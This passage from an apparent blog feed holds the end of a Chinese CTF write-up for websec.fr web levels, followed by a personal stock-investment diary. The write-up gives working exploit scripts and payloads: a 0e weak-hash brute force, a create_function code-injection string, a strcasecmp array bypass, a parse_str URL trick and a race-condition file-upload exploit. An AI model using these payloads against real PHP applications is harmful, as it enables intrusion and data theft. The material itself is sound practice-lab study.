class="hljs-variable">$request</span> == <span class="hljs-variable">$hash</span>) &#123;<br><span class="hljs-title function_ invoke__">show_source</span> (<span class="hljs-variable">$file</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Permission denied!&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/pre&gt;&lt;/div&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意到这里是弱相等，那么用0e绕过即可，但是怎样使得<code>$hash</code>出现0e呢，这里就需要构造文件名，我们需要读取flag.php，在php解析中在前面加&#x2F;并不会影响解析结果，但会影响md5的结果，这样就有了思路—爆破需要添加的&#x2F;的次数，直到绕过弱相等即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>prefix = <span class="hljs-string">&quot;./&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = requests.post(<span class="hljs-string">&quot;http://websec.fr/level10/index.php&quot;</span>, data=&#123;<br>        <span class="hljs-string">&#x27;hash&#x27;</span>: <span class="hljs-string">&quot;0e12345&quot;</span>,<br>        <span class="hljs-string">&#x27;f&#x27;</span>: prefix + <span class="hljs-string">&#x27;flag.php&#x27;</span><br>    &#125;)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;WEBSEC&#123;&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br>        <span class="hljs-keyword">break</span><br><br>    prefix += <span class="hljs-string">&quot;/&quot;</span><br></code></pre></td></tr></table></figure><h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>这里进行了函数创建，但并没有运行。查看create_function的官方文档，它会<code>eval</code>执行一个function __lambda_func (<fucntion-params>){<function-code>}字符串，我们可以用}提前闭合函数，并在后面注入我们需要执行的命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$flag&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br>    <span class="hljs-keyword">print</span>(<span class="hljs-variable">$success</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>; &#125;; <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><h3 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h3><p>程序中有一个函数引入了随机延迟，所以时间攻击无法实现。</p><blockquote><p>时间攻击：时间攻击是一种侧信道攻击，通过测量执行某些操作所需的时间，攻击者可以推断出某些信息。例如，通过测量字符串比较操作的执行时间，攻击者可能会推断出部分字符串内容。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep_rand</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/* I wish php5 had random_int() */</span><br>        <span class="hljs-variable">$range</span> = <span class="hljs-number">100000</span>;<br>        <span class="hljs-variable">$bytes</span> = (<span class="hljs-keyword">int</span>) (<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$range</span>, <span class="hljs-number">2</span>) / <span class="hljs-number">8</span>) + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">do</span> &#123;  <span class="hljs-comment">/* Side effect: more random cpu cycles wasted ;) */</span><br>            <span class="hljs-variable">$rnd</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-variable">$bytes</span>)));<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$rnd</span> &gt;= <span class="hljs-variable">$range</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-variable">$rnd</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>那唯一的突破口就变成了比较传入的字符和flag是否一致的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">strcasecmp</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], <span class="hljs-variable">$flag</span>))<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;&#x27;</span> . <span class="hljs-variable">$flag</span> . <span class="hljs-string">&#x27;&lt;/mark&gt;.&lt;/div&gt;&#x27;</span>;   <br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid flag, sorry.&lt;/div&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>strcasecmp</code>函数的正常使用介绍：<a href="https://cloud.tencent.com/developer/article/2051495">https://cloud.tencent.com/developer/article/2051495</a></p><p>接触过PHP弱类型比较题型的同学可能会知道，<code>strcmp()</code>和<code>strcasecmp()</code>函数用于比较两个字符串，前者区分大小写。这两个函数都无法处理数组，当传入数组时，返回null。所以，只需要使用POST方法传递一个<code>flag[]=1</code>即可绕过比较。</p><h3 id="level-25"><a href="#level-25" class="headerlink" title="level 25"></a>level 25</h3><p>尝试了php伪协议和通配符绕过的方法都没有成功，搜索也没有发现<code>stripos</code>函数有什么绕过方法，只能换一个思路搜索<code>parse_str</code>函数的相关问题，得知如果将正常url中的&#x2F;替换成&#x2F;&#x2F;&#x2F;，就会触发解析错误，返回false，就会跳过匹配过程。</p><blockquote><p>参考：<a href="https://www.freebuf.com/sectool/165452.html">https://www.freebuf.com/sectool/165452.html</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>])[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$v</span>, <span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You are not allowed to get the flag, sorry :/&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所以只要将网址改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//websec.fr///level25///index.php?page=flag</span><br></code></pre></td></tr></table></figure><h3 id="level-28"><a href="#level-28" class="headerlink" title="level 28"></a>level 28</h3><p>主要是理解源代码，我们可以任意传一个php文件，在php文件里写读flag的内容即可，但这里程序<code>sleep(1)</code>之后就会失效，所以要立刻访问它，由于网络限制手工操作肯定是不行的，写一个自动访问的python脚本就可以解决问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">4096</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Your file is too heavy.&#x27;</span>);<br>  &#125;<br>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./tmp/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><br>  <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;r&#x27;</span>);<br>  <span class="hljs-variable">$flagfilecontent</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]));<br>  @<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$flagfilecontent</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>) === <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checksum&#x27;</span>] == <span class="hljs-title function_ invoke__">crc32</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checksum&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);  <span class="hljs-comment">// it contains the `$flag` variable</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Nope, <span class="hljs-subst">$filename</span> is not the right file, sorry.&quot;</span>;<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// Deter bruteforce</span><br>    &#125;<br><br>  <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>exp.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;../flag.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>exp.py:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>md5ip=<br><br>URL = <span class="hljs-string">&quot;https://websec.fr/level28/tmp/&quot;</span><br>FILE = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;md5ip&#125;</span>.php&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    res = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>/<span class="hljs-subst">&#123;FILE&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">if</span> res.status_code != <span class="hljs-number">404</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NOPE&quot;</span>)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><p>运行python脚本的同时不断上传php文件，就可以在终端看到打印出的flag信息了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>投资日记</title>
    <link href="/2024/07/16/%E6%8A%95%E8%B5%84%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/07/16/%E6%8A%95%E8%B5%84%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<!--日期越新写在越前面--><h3 id="9月24日-周二"><a href="#9月24日-周二" class="headerlink" title="9月24日 周二"></a>9月24日 周二</h3><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>多头盛宴！央行降息降准降存量房贷利率，开启股票借贷便利，引入千亿资金活水。股汇债期联动，走出远古巨阳。目前市场仍在预期QE大放水，静待消息落地。目前指数继续走中大阳线的空间不大，但科技、消费等个股板块还有炒作空间，继续保持重仓，当股价偏离上升五日线过远时注意回踩，进行止盈换仓。今日工业富联涨停，大金融主题暴涨，贵州茅台逼近涨停，接下来是考验盯盘和选股能力的时候。但要继续观察量能，如果暴量滞涨注意规避风险。目前主观判断应该有逼近3000点的可能，希望目前的刺激政策能够修复各大指数的周级别和月级别技术线，走一个段落式反弹。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0924.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月23日-周一"><a href="#9月23日-周一" class="headerlink" title="9月23日 周一"></a>9月23日 周一</h3><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>国际地缘环境依然扑朔迷离，国际金价银价铜价均继续大幅上涨，石油的技术指标也得到修复。目前A股强撑大盘股，以双创为代表的小盘股仍在继续破新低，但由于上证指数支撑，有一些题材炒作可以延续，一个月以来依然没看到踩踏和任何放量，继续保持谨慎。对于港股，在连涨8天后，今日平收，可以认为是上涨趋势的顿挫，目前还有一定的博弈机会。近日大规模经济刺激政策的小道消息很多，但高层的定力很高，等待明日经济记者会的风向放出。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0923.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月20日-周五"><a href="#9月20日-周五" class="headerlink" title="9月20日 周五"></a>9月20日 周五</h3><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>今天在昨日美股大涨的催化下，A股科技股和资源股小幅反弹，以紫金矿业与浪潮信息的反弹为代表，走出了一个技术修复。目前资源股和人工智能科技股的趋势线勾头向上，希望能有持续性。今日主要指数下跌，可见短线趋势并没有改变，但国家队突然现身并大量买入指数ETF，目前原因未明。目前降息预期落空，国债市场依然狂飙不止，没有刺激性政策A股短期难言趋势转好，继续看资源股的修复和恒生科技的上涨行情，A股继续保持谨慎。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0920.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月19日-周四"><a href="#9月19日-周四" class="headerlink" title="9月19日 周四"></a>9月19日 周四</h3><h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><p>美联储超预期降息50个基点，全球主要资本市场、黄金、原油均在今天出现上涨，明天将公布LPR和日本央行决议。今日港股开盘即拉升，恒生科技涨超3%，符合美联储释放流动性利好港股的判断，同时受到外围带动，A股也在十点过后出现拉升，但并没有出现情绪龙头带队，成交量保持在7000亿以下，可见资金谨慎的态度。但今日未放量的拉升也并非坏事，如果放巨量回落说明情绪根本没有回暖，资金仍在大量出逃。如果明天能释放利好，并且走出阶梯式放量，结合当前走平的大盘均线，可能会构造出一个小圆弧底并走出一段小反弹，指数的行情没有基本面支撑，但概念股和中概互联网可能存在博弈利润的空间。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0919.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月18日-周三"><a href="#9月18日-周三" class="headerlink" title="9月18日 周三"></a>9月18日 周三</h3><h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><p>本周是全球央行超级周，今夜美联储将宣布正式进入降息周期，日本央行和中国央行也将发表讲话，国内有进一步放水降息的预期。目前按照交易预期，如果美联储不进行大幅降息，则主要资本市场和贵金属大概率发生回调，总体趋势还得结合地缘环境和经济衰退预期的变化来判断。今日A股下破2700点，之后国家队现身上证50ETF和沪深300ETF护盘，将沪指拉红，但情绪线和科技线并没有利好催化。目前继续看A股下跌杀恐慌盘，继续保持对大盘股和白马股的持有规避情绪化杀跌风险，待底部确立可以布局新能源等超跌品种。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0918.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月13日-周五"><a href="#9月13日-周五" class="headerlink" title="9月13日 周五"></a>9月13日 周五</h3><h4 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h4><p>今日锂矿继续大幅下跌，创业板跌超1%，节前大盘表现依然弱势。目前国际资本市场和商品市场继续修复，没有走出继续计价衰退的趋势。昨日黄金突然暴涨，原因不明，银铜也跟着反弹，今日A股贵金属股票大幅反弹，但预计并不会有持续性。美联储降息即将到来，代表全球科技焦点的英伟达连续大涨，带动A股英伟达概念大幅修复，在A股弱势的情况下主力仍坚定抢筹，继续看好。前日中海油金针探底后今日大幅反弹，但还没到持仓成本价，继续跟踪，考虑投资性价比进行配置切换。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0913.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月12日-周四"><a href="#9月12日-周四" class="headerlink" title="9月12日 周四"></a>9月12日 周四</h3><h4 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h4><p>今日锂矿果然下跌，昨日逃顶成功，但由于股票本身性价比不低，如果下跌到涨停阳线的半分位可以考虑补仓。三桶油昨日放量探底回升之后今日小幅上涨，但只是缓涨修复，没有强势进攻，可能与原油价格底部还未探明有关。A股今日早盘开盘双创领涨，下午风格突变，银行石油拉升而科技股下跌，最终三大指数收阴，科创50领跌。目前没有强力刺激料九月还有一段杀跌，继续保持对科技股配置的谨慎态度。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0912.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月11日-周三"><a href="#9月11日-周三" class="headerlink" title="9月11日 周三"></a>9月11日 周三</h3><h4 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h4><p>今天A股小幅收阳，涨少跌多，双创领涨，港股走出小型探底回升。今日新能源上游产业链减产消息驱动，锂矿等能源金属众多明星股涨停。受到全球衰退预期影响，布伦特原油价格于近日跌至70美元以下，暂未有确认企稳的趋势，今日三桶油继续暴跌，但放量回升收金针探底，预期短线会有修复，但是否能扭转下跌趋势还暂未确立。目前A股仍然没有见底特征，继续保持谨慎等待刺激政策发力或入场资金。</p><h3 id="9月10日-周二"><a href="#9月10日-周二" class="headerlink" title="9月10日 周二"></a>9月10日 周二</h3><h4 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h4><p>今天A股三大指数探底回升小幅收阳，近日市场高低切换特征明显，以人工智能为代表，近日上证指数大跌时并没有下探2月份低点，同时创业板指数见低点的同时银行指数见高点。今天受苹果和华为发布会科技春晚情绪影响，市场自发炒作产业链股票，国家队并没有花大钱露面，但股债跷跷板并没有成立，成交量也并没有放出，可见没有增量资金入场。未来两日可能会重新掉头向下，等待行情验证。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0910.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月9日-周一"><a href="#9月9日-周一" class="headerlink" title="9月9日 周一"></a>9月9日 周一</h3><h4 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h4><p>今天A股上证指数继续走出加速下跌，大盘资源股继续暴跌，国家队并没有在上证50和沪深300ETF露面，但却离奇拉升创业板，可能与前两周拉升中证1000ETF有关。今天加速下跌杀止损盘的形态成立，但仍然没有大量恐慌涌出，近期继续保持持有不动。目前港股恒生科技位置已经极具性价比，投资回报在A股没有重大利好的情况下预计将高于创业板、科创板，布局窗口在美联储宣布降息附近。继续投资新质生产力人工智能半导体板块，以锂矿、光伏为代表的新能源基本面没有好转，但弹性较大，可以适当博弈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0909.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月6日-周五"><a href="#9月6日-周五" class="headerlink" title="9月6日 周五"></a>9月6日 周五</h3><h4 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h4><p>今天A股走出一根中阴线，但没有出现放量的恐慌，继续处于加速下跌趋势。目前已经即将达到年线支撑2750附近，可能会有所徘徊，但继续下探的可能性极大，除非能杀出两根中大阴线叠加政策和国家队双重发力才能快速走出修复上涨行情。目前已经没什么操作的机会，手中持有的股票已经位置很低，近期继续减少操作频率，在杀恐慌期间寻找错杀的高性价比股票。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0906.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月5日-周四"><a href="#9月5日-周四" class="headerlink" title="9月5日 周四"></a>9月5日 周四</h3><h4 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h4><p>今天A股国家队又出面护盘，继续缩量横盘，没有看出恐慌盘的痕迹。但目前许多科技个股小票的五日十日技术线走平，如果明天在创业板、中证500等指数补量站上五日线，则可能还有一波小票反弹的行情可以做。目前主要布局在从高位跳下来的红利大盘股，今日神华和海油居然继续下探低点，这是超乎预料的。目前继续保持持仓不动，大盘没有走出恐慌跳水的格局则继续对科技股保持谨慎，红利股一定会有继续走牛的时机，继续持仓静待即可。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0905.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月4日-周三"><a href="#9月4日-周三" class="headerlink" title="9月4日 周三"></a>9月4日 周三</h3><h4 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h4><p>今天A股走出加速下跌，昨日资金计价🇺🇸经济衰退，美股暴跌，英伟达跌近10%，原油跌近5%，导致今日A股石油股大跌，资源股补跌。今日小票表现尚可，创业板和科创板走震荡。但以上证指数为代表，走势已经严重偏离五日线，代表国家队护盘的510300近日也没有明显动作。目前希望在近五个交易日能继续下杀出恐慌，成交量放出，跌幅放大，跌停家数增多。目前主要资金配置在科技龙头白马股和资源权重股，继续保持谨慎，减少操作。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0904.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月3日-周二"><a href="#9月3日-周二" class="headerlink" title="9月3日 周二"></a>9月3日 周二</h3><h4 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h4><p>外围局势风雨飘摇，纽约铜直逼新低，资金计价全球经济衰退。今天的行情也是扑朔迷离，昨日小盘阴包阳，今日大盘股补跌而创业板科创板弱势修复，缩量站回五日线。目前继续保持指数仍在加速下跌阶段观点不变，但跌幅空间极其有限。最近行情没有主线规律可循，暂时不伸手，以中国海油、中国神华为代表的高股息护盘类品种，若进行拉升护盘，早日止盈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0903.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月2日-周一"><a href="#9月2日-周一" class="headerlink" title="9月2日 周一"></a>9月2日 周一</h3><h4 id="总结-14"><a href="#总结-14" class="headerlink" title="总结"></a>总结</h4><p>上周五上涨的中阳线走出阴包阳，行情十分卑劣，周五的增量盘又被套住，看未来几日，国家队是否出面死顶盘面。继续保持行情需要恐慌盘涌出才有抄底机会的观点，继续观察浪潮信息、中科曙光的周线缺口是否能够得到回补。港股目前走得比A股坚韧，考虑港股龙头企业基本面回暖和美联储降息流动性增加预期，可以逐渐进行布局。但港股受到A股的压制，利润博弈空间不确定，不宜重仓。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0902.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月份总结"><a href="#8月份总结" class="headerlink" title="8月份总结"></a>8月份总结</h3><p>因为技术受限和懒惰，在家没有更新。8月中下旬呈现缩量下跌格局，白马股杀流动性，中小盘股跌跌不休，深成指和创业板指皆逼近2月份低点，在月末迎来了全面普反，各大指数站上五日线，在九月初预计还有一段小幅反弹和题材唱戏的行情。目前AI人工智能的位置很低，投资价值凸显，但是长期横盘缩量没有恐慌盘涌出的阴影仍然笼罩，目前继续认为今年下半年的低点不在2815点，保持谨慎。</p><h3 id="8月7日-周三"><a href="#8月7日-周三" class="headerlink" title="8月7日 周三"></a>8月7日 周三</h3><h4 id="总结-15"><a href="#总结-15" class="headerlink" title="总结"></a>总结</h4><p>今日刚刚盯上红利股最近走弱，红利股就大幅反弹，其中中国海油目前性价比凸显，可作为日后避险选择。今日科技股本震荡整理，但下午突然跳水，多数科技板块破位，警惕杀跌风险。目前浪潮信息已经连跌3周，从之前的周线来看，都会有两周左右的反弹窗口，如果指数未来两天没有走弱，且浪潮信息没有快速修复，可以进行适当调仓。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0807.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月6日-周二"><a href="#8月6日-周二" class="headerlink" title="8月6日 周二"></a>8月6日 周二</h3><h4 id="总结-16"><a href="#总结-16" class="headerlink" title="总结"></a>总结</h4><p>今日日韩台股大幅修复，昨日纳斯达克探底收大阳线，资本市场局势扑朔迷离，今日沪深300大部分时间运行在国家队平均成本以下，尾盘国家队突然入场将沪深300拉红，可见仍然在维稳，等待7月宏观数据和港股科技巨头中报数据，目前中期形势依然不改，每一次修复都是优化仓位的时机。继续布局恒生科技和中概互联网，博弈美股七巨头的修复行情。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0806.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月5日-周一"><a href="#8月5日-周一" class="headerlink" title="8月5日 周一"></a>8月5日 周一</h3><h4 id="总结-17"><a href="#总结-17" class="headerlink" 